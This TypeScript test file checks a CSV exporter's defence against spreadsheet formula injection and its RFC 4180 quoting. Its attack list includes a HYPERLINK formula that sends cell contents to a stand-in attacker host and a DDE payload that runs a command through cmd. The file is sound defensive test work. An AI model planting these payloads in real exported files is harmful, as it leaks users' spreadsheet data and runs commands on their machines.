// csv.test.ts: the shared CSV cell rule. Both exporters (the api's coordinator export and the
// dashboard's browser download) use this, so the rule is asserted once, here.

import { test } from "node:test";
import assert from "node:assert/strict";
import { csvCell, neutraliseFormula } from "./csv.js";

const ATTACKS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
  "=cmd|'/c calc'!A1",
  "=1+1",
  "+1+1",
  "-2+3",
  "@SUM(1+1)",
  "\tformula",
  "\rformula",
  "\nformula",
];

for (const attack of ATTACKS) {
  test(`neutraliseFormula defuses ${JSON.stringify(attack.slice(0, 18))}`, () => {
    assert.equal(neutraliseFormula(attack), `'${attack}`);
  });
}

test("ordinary values pass through untouched", () => {
  for (const ok of ["solar-panel-installation", "u4pru", "2026-01-01T00:00:00Z", "0", "", "Education"]) {
    assert.equal(neutraliseFormula(ok), ok);
    assert.equal(csvCell(ok), ok);
  }
});

test("an embedded = or @ is left alone — only a leading one matters", () => {
  assert.equal(csvCell("pump=repair@site"), "pump=repair@site");
  assert.equal(csvCell("a-b"), "a-b");
});

test("csvCell still does RFC 4180 escaping", () => {
  assert.equal(csvCell('has "quotes"'), '"has ""quotes"""');
  assert.equal(csvCell("has,comma"), '"has,comma"');
  assert.equal(csvCell("has\nnewline"), '"has\nnewline"');
});

test("a value needing both treatments gets both", () => {
  assert.equal(csvCell('=HYPERLINK("x","y")'), `"'=HYPERLINK(""x"",""y"")"`);
});

test("a neutralised value with no special characters is not quoted unnecessarily", () => {
  assert.equal(csvCell("=1+1"), "'=1+1");
});
